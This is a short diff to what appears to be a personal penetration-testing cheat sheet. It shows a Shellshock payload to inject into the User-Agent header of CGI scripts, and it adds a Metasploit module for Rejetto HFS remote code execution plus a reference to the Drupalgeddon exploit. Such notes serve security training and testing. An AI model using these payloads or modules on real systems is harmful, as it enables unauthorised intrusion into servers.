@@ -111,6 +111,13 @@ SHELLSHOCK -
 look for cgi, find directory and inject into user-agent
 () { :; }; echo; echo; /bin/bash -c 'script'
 
+Rejetto -
+use exploit/windows/http/rejetto_hfs_exec
+
+Drupal -
+drupalgeddon
+
+
 
 
 
